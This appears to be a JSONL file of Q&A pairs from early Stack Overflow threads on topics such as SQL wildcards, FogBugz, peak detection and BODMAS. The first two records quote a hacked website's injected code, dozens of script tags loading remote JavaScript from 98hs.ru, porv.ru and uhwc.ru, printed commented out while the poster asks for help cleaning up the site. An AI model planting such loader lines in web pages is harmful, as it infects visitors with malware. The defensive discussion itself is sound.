{"instruction": "My dad called me today and said people going to his website were getting 168 viruses trying to download to their computers. He isn't technical at all, and built the whole thing with a WYSIWYG editor.\nI popped his site open and viewed the source, and there was a line of Javascript includes at the bottom of the source right before the closing HTML tag. They included this file (among many others): http://www.98hs.ru/js.js <-- TURN OFF JAVASCRIPT BEFORE YOU GO TO THAT URL.\nSo I commented it out for now. It turns out his ftp password was a plain dictionary word six letters long, so we think that's how it got hacked. We've changed his password to an 8+ digit non-word string (he wouldn't go for a passphrase since he is a hunt-n-peck typer).\nI did a whois on 98hs.ru and found it is hosted from a server in Chile. There is actually an e-mail address associated with it too, but I seriously doubt this person is the culprit. Probably just some other site that got hacked...\nI have no idea what to do at this point though as I've never dealt with this sort of thing before. Anyone have any suggestions?\nHe was using plain jane un-secured ftp through webhost4life.com. I don't even see a way to do sftp on their site. I'm thinking his username and password got intercepted?\nSo, to make this more relevant to the community, what are the steps you should take/best practices you should follow to protect your website from getting hacked?\nFor the record, here is the line of code that \"magically\" got added to his file (and isn't in his file on his computer -- I've left it commented out just to make absolute sure it won't do anything on this page, although I'm sure Jeff would guard against this):\n<!--script src=http://www.98hs.ru/js.js></script><script src=http://www.98hs.ru/js.js></script><script src=http://www.98hs.ru/js.js></script><script src=http://www.98hs.ru/js.js></script><script src=http://www.98hs.ru/js.js></script><script src=http://www.98hs.ru/js.js></script><script src=http://www.porv.ru/js.js></script><script src=http://www.98hs.ru/js.js></script><script src=http://www.porv.ru/js.js></script><script src=http://www.98hs.ru/js.js></script><script src=http://www.porv.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.98hs.ru/js.js></script><script src=http://www.porv.ru/js.js></script><script src=http://www.98hs.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.98hs.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.porv.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.porv.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.porv.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.porv.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.porv.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.porv.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.porv.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.porv.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.porv.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.porv.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.porv.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.porv.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.porv.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.porv.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.porv.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.porv.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script-->", "output": "Is the site just plain static HTML? i.e. he hasn't managed to code himself an upload page that permits anyone driving by to upload compromised scripts/pages?\nWhy not ask webhost4life if they have any FTP logs available and report the issue to them. You never know, they may be quite receptive and find out for you exactly what happened? \nI work for a shared hoster and we always welcome reports such as these and can usually pinpoint the exact vector of attack based and advise as to where the customer went wrong."}
{"instruction": "My dad called me today and said people going to his website were getting 168 viruses trying to download to their computers. He isn't technical at all, and built the whole thing with a WYSIWYG editor.\nI popped his site open and viewed the source, and there was a line of Javascript includes at the bottom of the source right before the closing HTML tag. They included this file (among many others): http://www.98hs.ru/js.js <-- TURN OFF JAVASCRIPT BEFORE YOU GO TO THAT URL.\nSo I commented it out for now. It turns out his ftp password was a plain dictionary word six letters long, so we think that's how it got hacked. We've changed his password to an 8+ digit non-word string (he wouldn't go for a passphrase since he is a hunt-n-peck typer).\nI did a whois on 98hs.ru and found it is hosted from a server in Chile. There is actually an e-mail address associated with it too, but I seriously doubt this person is the culprit. Probably just some other site that got hacked...\nI have no idea what to do at this point though as I've never dealt with this sort of thing before. Anyone have any suggestions?\nHe was using plain jane un-secured ftp through webhost4life.com. I don't even see a way to do sftp on their site. I'm thinking his username and password got intercepted?\nSo, to make this more relevant to the community, what are the steps you should take/best practices you should follow to protect your website from getting hacked?\nFor the record, here is the line of code that \"magically\" got added to his file (and isn't in his file on his computer -- I've left it commented out just to make absolute sure it won't do anything on this page, although I'm sure Jeff would guard against this):\n<!--script src=http://www.98hs.ru/js.js></script><script src=http://www.98hs.ru/js.js></script><script src=http://www.98hs.ru/js.js></script><script src=http://www.98hs.ru/js.js></script><script src=http://www.98hs.ru/js.js></script><script src=http://www.98hs.ru/js.js></script><script src=http://www.porv.ru/js.js></script><script src=http://www.98hs.ru/js.js></script><script src=http://www.porv.ru/js.js></script><script src=http://www.98hs.ru/js.js></script><script src=http://www.porv.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.98hs.ru/js.js></script><script src=http://www.porv.ru/js.js></script><script src=http://www.98hs.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.98hs.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.porv.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.porv.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.porv.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.porv.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.porv.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.porv.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.porv.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.porv.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.porv.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.porv.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.porv.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.porv.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.porv.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.porv.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.porv.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.porv.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script><script src=http://www.uhwc.ru/js.js></script-->", "output": "You mention your Dad was using a website publishing tool.\nIf the publishing tool publishes from his computer to the server, it may be the case that his local files are clean, and that he just needs to republish to the server.\nHe should see if there's a different login method to his server than plain FTP, though... that's not very secure because it sends his password as clear-text over the internet."}
{"instruction": "Let's say that we have an ARGB color:\nColor argb = Color.FromARGB(127, 69, 12, 255); //Light Urple.\n\nWhen this is painted on top of an existing color, the colors will blend. So when it is blended with white, the resulting color is Color.FromARGB(255, 162, 133, 255);\nThe solution should work like this:\nColor blend = Color.White; \nColor argb = Color.FromARGB(127, 69, 12, 255); //Light Urple.      \nColor rgb = ToRGB(argb, blend); //Same as Color.FromARGB(255, 162, 133, 255);\n\nWhat is ToRGB's implementation?", "output": "if you don't need to know this pre-render, you could always use the win32 method of getpixel, I believe. \nNote: typing on iPhone in the middle of Missouri with no inet access. Will look up real win32 example and see if there is a .net equivalent.\nIn case anyone cares, and doesn't want to use the (excellent) answer posted above, you can get the color value of a pixel in .Net via this link MSDN example"}
{"instruction": "I'm having trouble figuring out how to get the testing framework set up and usable in Visual Studio 2008 for C++ presumably with the built-in unit testing suite.\nAny links or tutorials would be appreciated.", "output": "I use UnitTest++.\nIn the years since I made this post the source has moved from SourceForge to github.  Also the example tutorial is now more agnostic - doesn't go into any configuration or project set up at all.\nI doubt it will still work for Visual Studio 6 as the project files are now created via CMake. If you still need the older version support you can get the last available version under the SourceForge branch."}
{"instruction": "Is there anyone working solo and using fogbugz out there? I'm interested in personal experience/overhead versus paper.\nI am involved in several projects and get pretty hammered with lots of details to keep track of... Any experience welcome.\n(Yes I know Mr. Joel is on the stackoverflow team... I still want good answers :)", "output": "I use it, especially since the hosted Version of FugBugz is free for up to 2 people. I found it a lot nicer than paper as I'm working on multiple projects, and my paper tends to get rather messy once you start making annotations or if you want to re-organize and shuffle tasks around, mark them as complete only to see that they are not complete after all...\nPlus, the Visual Studio integration is really neat, something paper just cannot compete with. Also, if you lay the project to rest for 6 months and come back, all your tasks and notes are still there, whereas with paper you may need to search all the old documents and notes again, if you did not discard it.\nBut that is just the point of view from someone who is not really good at staying organized :-) If you are a really tidy and organized person, paper may work better for you than it does for me.\nBonus suggestion: Run Fogbugz on a second PC (or a small Laptop like the eeePC) so that you always have it at your fingertips. The main problem with Task tracking programs - be it FogBugz, Outlook, Excel or just notepad - is that they take up screen space, and my two monitors are usually full with Visual Studio, e-Mail, Web Browsers, some Notepads etc."}
{"instruction": "Is there anyone working solo and using fogbugz out there? I'm interested in personal experience/overhead versus paper.\nI am involved in several projects and get pretty hammered with lots of details to keep track of... Any experience welcome.\n(Yes I know Mr. Joel is on the stackoverflow team... I still want good answers :)", "output": "I use it as well and quite frankly wouldn't want to work without it.\nI've always had some kind of issue tracker available for the projects I work on and thus am quite used to updating it. With FB6 the process is now even better.\nSince FB also integrates with Subversion, the source control tool I use for my projects, the process is really good and I have two-way links between the two systems now. I can click on a case number in the Subversion logs and go to the case in FB, or see the revisions bound to a case inside FB."}
{"instruction": "Is there anyone working solo and using fogbugz out there? I'm interested in personal experience/overhead versus paper.\nI am involved in several projects and get pretty hammered with lots of details to keep track of... Any experience welcome.\n(Yes I know Mr. Joel is on the stackoverflow team... I still want good answers :)", "output": "When I was working for myself doing my consulting business I signed up for a hosted account and honestly I couldn't have done without it. \nWhat I liked most about it was it took 30 seconds to sign up for an account and I was then able to integrate source control using sourcegear vault (which is an excellent source control product and free for single developers) set up projects, clients, releases and versions and monitor my progress constantly.\nOne thing that totally blew me away was that I ended up completely abandoning outlook for all work related correspondence. I could manage all my client interactions from within fogbugz and it all just worked amazingly well.\nIn terms of overhead, one of the nice things you could do was turn anything into a case. Anything that came up in your mind while you were coding, you simply created a new email, sent it to fogbugz and it was instantly added as an item for review later.\nI would strongly recommend you get yourself one of the hosted accounts and give it a whirl"}
{"instruction": "We use a data acquisition card to take readings from a device that increases its signal to a peak and then falls back to near the original value. To find the peak value we currently search the array for the highest reading and use the index to determine the timing of the peak value which is used in our calculations.\nThis works well if the highest value is the peak we are looking for but if the device is not working correctly we can see a second peak which can be higher than the initial peak. We take 10 readings a second from 16 devices over a 90 second period.\nMy initial thoughts are to cycle through the readings checking to see if the previous and next points are less than the current to find a peak and construct an array of peaks. Maybe we should be looking at a average of a number of points either side of the current position to allow for noise in the system. Is this the best way to proceed or are there better techniques?\n\nWe do use LabVIEW and I have checked the LAVA forums and there are a number of interesting examples. This is part of our test software and we are trying to avoid using too many non-standard VI libraries so I was hoping for feedback on the process/algorithms involved rather than specific code.", "output": "You could try signal averaging, i.e. for each point, average the value with the surrounding 3 or more points. If the noise blips are huge, then even this may not help.\nI realise that this was language agnostic, but guessing that you are using LabView, there are lots of pre-packaged signal processing VIs that come with LabView that you can use to do smoothing and noise reduction. The NI forums are a great place to get more specialised help on this sort of thing."}
{"instruction": "We use a data acquisition card to take readings from a device that increases its signal to a peak and then falls back to near the original value. To find the peak value we currently search the array for the highest reading and use the index to determine the timing of the peak value which is used in our calculations.\nThis works well if the highest value is the peak we are looking for but if the device is not working correctly we can see a second peak which can be higher than the initial peak. We take 10 readings a second from 16 devices over a 90 second period.\nMy initial thoughts are to cycle through the readings checking to see if the previous and next points are less than the current to find a peak and construct an array of peaks. Maybe we should be looking at a average of a number of points either side of the current position to allow for noise in the system. Is this the best way to proceed or are there better techniques?\n\nWe do use LabVIEW and I have checked the LAVA forums and there are a number of interesting examples. This is part of our test software and we are trying to avoid using too many non-standard VI libraries so I was hoping for feedback on the process/algorithms involved rather than specific code.", "output": "You could apply some Standard Devision to your logic and take notice of peaks over x%."}
{"instruction": "We use a data acquisition card to take readings from a device that increases its signal to a peak and then falls back to near the original value. To find the peak value we currently search the array for the highest reading and use the index to determine the timing of the peak value which is used in our calculations.\nThis works well if the highest value is the peak we are looking for but if the device is not working correctly we can see a second peak which can be higher than the initial peak. We take 10 readings a second from 16 devices over a 90 second period.\nMy initial thoughts are to cycle through the readings checking to see if the previous and next points are less than the current to find a peak and construct an array of peaks. Maybe we should be looking at a average of a number of points either side of the current position to allow for noise in the system. Is this the best way to proceed or are there better techniques?\n\nWe do use LabVIEW and I have checked the LAVA forums and there are a number of interesting examples. This is part of our test software and we are trying to avoid using too many non-standard VI libraries so I was hoping for feedback on the process/algorithms involved rather than specific code.", "output": "I think you want to cross-correlate your signal with an expected, exemplar signal. But, it has been such a long time since I studied signal processing and even then I didn't take much notice."}
{"instruction": "We use a data acquisition card to take readings from a device that increases its signal to a peak and then falls back to near the original value. To find the peak value we currently search the array for the highest reading and use the index to determine the timing of the peak value which is used in our calculations.\nThis works well if the highest value is the peak we are looking for but if the device is not working correctly we can see a second peak which can be higher than the initial peak. We take 10 readings a second from 16 devices over a 90 second period.\nMy initial thoughts are to cycle through the readings checking to see if the previous and next points are less than the current to find a peak and construct an array of peaks. Maybe we should be looking at a average of a number of points either side of the current position to allow for noise in the system. Is this the best way to proceed or are there better techniques?\n\nWe do use LabVIEW and I have checked the LAVA forums and there are a number of interesting examples. This is part of our test software and we are trying to avoid using too many non-standard VI libraries so I was hoping for feedback on the process/algorithms involved rather than specific code.", "output": "I don't know very much about instrumentation, so this might be totally impractical, but then again it might be a helpful different direction.  If you know how the readings can fail, and there is a certain interval between peaks given such failures, why not do gradient descent at each interval.  If the descent brings you back to an area you've searched before, you can abandon it.  Depending upon the shape of the sampled surface, this also might help you find peaks faster than search."}
{"instruction": "I'm wondering how to make a release build that includes all necessary dll files into the .exe so the program can be run on a non-development machine without it having to install the microsoft redistributable on the target machine.\nWithout doing this you get the error message that the application configuration is not correct and to reinstall.", "output": "You'd be looking to static link (as opposed to dynamically link)\r\n\r\nI'm not sure how many of the MS redistributables statically link in."}
{"instruction": "Note: I am using SQL's Full-text search capabilities, CONTAINS clauses and all - the * is the wildcard in full-text, % is for LIKE clauses only.\nI've read in several places now that \"leading wildcard\" searches (e.g. using \"*overflow\" to match \"stackoverflow\") is not supported in MS SQL.  I'm considering using a CLR function to add regex matching, but I'm curious to see what other solutions people might have.\nMore Info: You can add the asterisk only at the end of the word or phrase. - along with my empirical experience:  When matching \"myvalue\", \"my*\" works, but \"(asterisk)value\" returns no match, when doing a query as simple as:\nSELECT * FROM TABLENAME WHERE CONTAINS(TextColumn, '\"*searchterm\"');\n\nThus, my need for a workaround.  I'm only using search in my site on an actual search page - so it needs to work basically the same way that Google works (in the eyes on a Joe Sixpack-type user). Not nearly as complicated, but this sort of match really shouldn't fail.", "output": "The wildcard character in SQL Server is the % sign and it works just fine, leading, trailing or otherwise.\nThat said, if you're going to be doing any kind of serious full text searching then I'd consider utilising the Full Text Index capabilities. Using % and _ wild cards will cause your database to take a serious performance hit."}
{"instruction": "Note: I am using SQL's Full-text search capabilities, CONTAINS clauses and all - the * is the wildcard in full-text, % is for LIKE clauses only.\nI've read in several places now that \"leading wildcard\" searches (e.g. using \"*overflow\" to match \"stackoverflow\") is not supported in MS SQL.  I'm considering using a CLR function to add regex matching, but I'm curious to see what other solutions people might have.\nMore Info: You can add the asterisk only at the end of the word or phrase. - along with my empirical experience:  When matching \"myvalue\", \"my*\" works, but \"(asterisk)value\" returns no match, when doing a query as simple as:\nSELECT * FROM TABLENAME WHERE CONTAINS(TextColumn, '\"*searchterm\"');\n\nThus, my need for a workaround.  I'm only using search in my site on an actual search page - so it needs to work basically the same way that Google works (in the eyes on a Joe Sixpack-type user). Not nearly as complicated, but this sort of match really shouldn't fail.", "output": "% Matches any number of characters_ Matches a single character\nI've never used Full-Text indexing but you can accomplish rather complex and fast search queries with simply using the build in T-SQL string functions."}
{"instruction": "Note: I am using SQL's Full-text search capabilities, CONTAINS clauses and all - the * is the wildcard in full-text, % is for LIKE clauses only.\nI've read in several places now that \"leading wildcard\" searches (e.g. using \"*overflow\" to match \"stackoverflow\") is not supported in MS SQL.  I'm considering using a CLR function to add regex matching, but I'm curious to see what other solutions people might have.\nMore Info: You can add the asterisk only at the end of the word or phrase. - along with my empirical experience:  When matching \"myvalue\", \"my*\" works, but \"(asterisk)value\" returns no match, when doing a query as simple as:\nSELECT * FROM TABLENAME WHERE CONTAINS(TextColumn, '\"*searchterm\"');\n\nThus, my need for a workaround.  I'm only using search in my site on an actual search page - so it needs to work basically the same way that Google works (in the eyes on a Joe Sixpack-type user). Not nearly as complicated, but this sort of match really shouldn't fail.", "output": "One thing worth keeping in mind is that leading wildcard queries come at a significant performance premium, compared to other wildcard usages."}
{"instruction": "Note: I am using SQL's Full-text search capabilities, CONTAINS clauses and all - the * is the wildcard in full-text, % is for LIKE clauses only.\nI've read in several places now that \"leading wildcard\" searches (e.g. using \"*overflow\" to match \"stackoverflow\") is not supported in MS SQL.  I'm considering using a CLR function to add regex matching, but I'm curious to see what other solutions people might have.\nMore Info: You can add the asterisk only at the end of the word or phrase. - along with my empirical experience:  When matching \"myvalue\", \"my*\" works, but \"(asterisk)value\" returns no match, when doing a query as simple as:\nSELECT * FROM TABLENAME WHERE CONTAINS(TextColumn, '\"*searchterm\"');\n\nThus, my need for a workaround.  I'm only using search in my site on an actual search page - so it needs to work basically the same way that Google works (in the eyes on a Joe Sixpack-type user). Not nearly as complicated, but this sort of match really shouldn't fail.", "output": "The problem with leading Wildcards: They cannot be indexed, hence you're doing a full table scan."}
{"instruction": "Note: I am using SQL's Full-text search capabilities, CONTAINS clauses and all - the * is the wildcard in full-text, % is for LIKE clauses only.\nI've read in several places now that \"leading wildcard\" searches (e.g. using \"*overflow\" to match \"stackoverflow\") is not supported in MS SQL.  I'm considering using a CLR function to add regex matching, but I'm curious to see what other solutions people might have.\nMore Info: You can add the asterisk only at the end of the word or phrase. - along with my empirical experience:  When matching \"myvalue\", \"my*\" works, but \"(asterisk)value\" returns no match, when doing a query as simple as:\nSELECT * FROM TABLENAME WHERE CONTAINS(TextColumn, '\"*searchterm\"');\n\nThus, my need for a workaround.  I'm only using search in my site on an actual search page - so it needs to work basically the same way that Google works (in the eyes on a Joe Sixpack-type user). Not nearly as complicated, but this sort of match really shouldn't fail.", "output": "Using the '%' character I've searched our database using something like the following:\nSELECT name FROM TblNames WHERE name LIKE '%overflow'\r\n\nUsing this form or query can be slow at times but we only use it for the occasional manual search."}
{"instruction": "PostgreSQL is interesting in that it supports several languages for writing stored procedures.  Which one do you use, and why?", "output": "I have only really used PL/pgSQL, but that was because I needed a few stored procedures relatively fast and didn't want to add extra modules to the server.\nLonger term, I would probably use PL/Perl or PL/Python, as I use perl for quick scripting and have been looking at python for a while now.\nOne thing I have found is that there is a lack of good documentation for that on the PostgreSQL site. The manuals were thorough as a reference, but did not work well as a tutorial to help show people how it should be done.\nThat, combined with a very good debugging environment, meant that my first experience of writing procedures involved looking at weird syntax errors for a long time.\nIf someone knows of a good site with tutorials etc for PostgreSQL programming, I would love to get a link to it."}
{"instruction": "I have a very simple problem which requires a very quick and simple solution in SQL Server 2005.\nI have a table with x Columns. I want to be able to select one row from the table and then transform the columns into rows.\nTableA\nColumn1, Column2, Column3\n\nSQL Statement to ruturn\nResultA\nValue of Column1\nValue of Column2\nValue of Column3\n\n\n@Kevin: I've had a google search on the topic but alot of the example where overly complex for my example, are you able to help further?\n@Mario: The solution I am creating has 10 columns which stores the values 0 to 6 and I must work out how many columns have the value 3 or more. So I thought about creating a query to turn that into rows and then using the generated table in a subquery to say count the number of rows with Column >= 3", "output": "You should take a look at the UNPIVOT clause.\nUpdate1: GateKiller, strangely enough I read an article (about something unrelated) about it this morning and I'm trying to jog my memory where I saw it again, had some decent looking examples too. It'll come back to me I'm sure.\nUpdate2: Found it: http://weblogs.sqlteam.com/jeffs/archive/2008/04/23/unpivot.aspx"}
{"instruction": "I have a very simple problem which requires a very quick and simple solution in SQL Server 2005.\nI have a table with x Columns. I want to be able to select one row from the table and then transform the columns into rows.\nTableA\nColumn1, Column2, Column3\n\nSQL Statement to ruturn\nResultA\nValue of Column1\nValue of Column2\nValue of Column3\n\n\n@Kevin: I've had a google search on the topic but alot of the example where overly complex for my example, are you able to help further?\n@Mario: The solution I am creating has 10 columns which stores the values 0 to 6 and I must work out how many columns have the value 3 or more. So I thought about creating a query to turn that into rows and then using the generated table in a subquery to say count the number of rows with Column >= 3", "output": "UNION should be your friend:\nSELECT Column1 FROM table WHERE idColumn = 1UNION ALLSELECT Column2 FROM table WHERE idColumn = 1UNION ALLSELECT Column3 FROM table WHERE idColumn = 1\nbut it can also be your foe on large result sets."}
{"instruction": "I have a very simple problem which requires a very quick and simple solution in SQL Server 2005.\nI have a table with x Columns. I want to be able to select one row from the table and then transform the columns into rows.\nTableA\nColumn1, Column2, Column3\n\nSQL Statement to ruturn\nResultA\nValue of Column1\nValue of Column2\nValue of Column3\n\n\n@Kevin: I've had a google search on the topic but alot of the example where overly complex for my example, are you able to help further?\n@Mario: The solution I am creating has 10 columns which stores the values 0 to 6 and I must work out how many columns have the value 3 or more. So I thought about creating a query to turn that into rows and then using the generated table in a subquery to say count the number of rows with Column >= 3", "output": "If you have a fixed set of columns and you know what they are, you can basically do a series of subselects \n(SELECT Column1 AS ResultA FROM TableA) as R1 \nand join the subselects. All this in a single query."}
{"instruction": "What is BODMAS and why is it useful in programming?", "output": "http://www.easymaths.com/What_on_earth_is_Bodmas.htm:\n\nWhat do you think the answer to 2 + 3 x 5 is?\nIs it (2 + 3) x 5 = 5 x 5 = 25 ?\nor 2 + (3 x 5) = 2 + 15 = 17 ?\nBODMAS can come to the rescue and give us rules to follow so that we always get the right answer:\n(B)rackets (O)rder (D)ivision (M)ultiplication (A)ddition (S)ubtraction\nAccording to BODMAS, multiplication should always be done before addition, therefore 17 is actually the correct answer according to BODMAS and will also be the answer which your calculator will give if you type in 2 + 3 x 5 .\n\nWhy it is useful in programming? No idea, but i assume it's because you can get rid of some brackets? I am a quite defensive programmer, so my lines can look like this:\nresult = (((i + 4) - (a + b)) * MAGIC_NUMBER) - ANOTHER_MAGIC_NUMBER;\n\nwith BODMAS you can make this a bit clearer:\nresult = (i + 4 - (a + b)) * MAGIC_NUMBER - ANOTHER_MAGIC_NUMBER;\n\nI think i'd still use the first variant - more brackets, but that way i do not have to learn yet another rule and i run into less risk of forgetting it and causing those weird hard to debug errors?\nJust guessing at that part though.\nMike Stone EDIT: Fixed math as Gaius points out"}
{"instruction": "I have a very simple problem which requires a very quick and simple solution in SQL Server 2005.\nI have a table with x Columns. I want to be able to select one row from the table and then transform the columns into rows.\nTableA\nColumn1, Column2, Column3\n\nSQL Statement to ruturn\nResultA\nValue of Column1\nValue of Column2\nValue of Column3\n\n\n@Kevin: I've had a google search on the topic but alot of the example where overly complex for my example, are you able to help further?\n@Mario: The solution I am creating has 10 columns which stores the values 0 to 6 and I must work out how many columns have the value 3 or more. So I thought about creating a query to turn that into rows and then using the generated table in a subquery to say count the number of rows with Column >= 3", "output": "I'm not sure of the SQL Server syntax for this but in MySQL I would do\nSELECT IDColumn, ( IF( Column1 >= 3, 1, 0 ) + IF( Column2 >= 3, 1, 0 ) + IF( Column3 >= 3, 1, 0 ) + ... [snip ] )\n  AS NumberOfColumnsGreaterThanThree\nFROM TableA;\n\nEDIT: A very (very) brief Google search tells me that the CASE statement does what I am doing with the IF statement in MySQL.  You may or may not get use out of the Google result I found\nFURTHER EDIT: I should also point out that this isn't an answer to your question but an alternative solution to your actual problem."}
{"instruction": "What is BODMAS and why is it useful in programming?", "output": "Another version of this (in middle school) was \"Please Excuse My Dear Aunt Sally\".\n\nParentheses\nExponents\nMultiplication\nDivision\nAddition\nSubtraction\n\nThe mnemonic device was helpful in school, and still useful in programming today."}
{"instruction": "What is BODMAS and why is it useful in programming?", "output": "Order of operations in an expression, such as:\nfoo * (bar + baz^2 / foo)\n\n\nBrackets first\nOrders (ie Powers and Square Roots, etc.)\nDivision and Multiplication (left-to-right)\nAddition and Subtraction (left-to-right)\n\nsource: http://www.mathsisfun.com/operation-order-bodmas.html"}
{"instruction": "Note: I am using SQL's Full-text search capabilities, CONTAINS clauses and all - the * is the wildcard in full-text, % is for LIKE clauses only.\nI've read in several places now that \"leading wildcard\" searches (e.g. using \"*overflow\" to match \"stackoverflow\") is not supported in MS SQL.  I'm considering using a CLR function to add regex matching, but I'm curious to see what other solutions people might have.\nMore Info: You can add the asterisk only at the end of the word or phrase. - along with my empirical experience:  When matching \"myvalue\", \"my*\" works, but \"(asterisk)value\" returns no match, when doing a query as simple as:\nSELECT * FROM TABLENAME WHERE CONTAINS(TextColumn, '\"*searchterm\"');\n\nThus, my need for a workaround.  I'm only using search in my site on an actual search page - so it needs to work basically the same way that Google works (in the eyes on a Joe Sixpack-type user). Not nearly as complicated, but this sort of match really shouldn't fail.", "output": "From SQL Server Books Online:\n\nTo write full-text queries in Microsoft SQL Server 2005, you must learn how to use the CONTAINS and FREETEXT Transact-SQL predicates, and the CONTAINSTABLE and FREETEXTTABLE rowset-valued functions.\nThat means all of the queries written above with the % and _ are not valid full text queries.\nHere is a sample of what a query looks like when calling the CONTAINSTABLE function.\n\nSELECT RANK , * FROM TableName , CONTAINSTABLE (TableName, , ' \"WildCard\" ') searchTable WHERE [KEY] = TableName.pk ORDER BY searchTable.RANK DESC\nIn order for the CONTAINSTABLE function to know that I'm using a wildcard search, I have to wrap it in double quotes. I can use the wildcard character * at the beginning or ending. There are a lot of other things you can do when you're building the search string for the CONTAINSTABLE function. You can search for a word near another word, search for inflectional words (drive = drives, drove, driving, and driven), and search for synonym of another word (metal can have synonyms such as aluminum and steel).\nI just created a table, put a full text index on the table and did a couple of test searches and didn't have a problem, so wildcard searching works as intended.\n[Update]\nI see that you've updated your question and know that you need to use one of the functions.\nYou can still search with the wildcard at the beginning, but if the word is not a full word following the wildcard, you have to add another wildcard at the end.Example:  \"*ildcar\" will look for a single word as long as it ends with \"ildcar\".Example:  \"*ildcar*\" will look for a single word with \"ildcar\" in the middle, which means it will match \"wildcard\".  [Just noticed that Markdown removed the wildcard characters from the beginning and ending of my quoted string here.]\n[Update #2]\nDave Ward - Using a wildcard with one of the functions shouldn't be a huge perf hit. If I created a search string with just \"*\", it will not return all rows, in my test case, it returned 0 records."}
{"instruction": "Is there anyone working solo and using fogbugz out there? I'm interested in personal experience/overhead versus paper.\nI am involved in several projects and get pretty hammered with lots of details to keep track of... Any experience welcome.\n(Yes I know Mr. Joel is on the stackoverflow team... I still want good answers :)", "output": "In addition to the benefits already mentioned, another nice feature of using FogBugz is BugzScout, which you can use to report errors from your app and log them into FogBugz automatically.  If you're a one person team, chances are there are some bugs in your code you've never seen during your own testing, so it's nice to have those bugs found \"in the wild\" automatically reported and logged for you."}
{"instruction": "What is BODMAS and why is it useful in programming?", "output": "When I learned this in grade school (in Canada) it was referred to as BEDMAS:\nBrackets \nExponents \nDivision \nMultiplication \nAddition \nSubtraction\nJust for those from this part of the world..."}
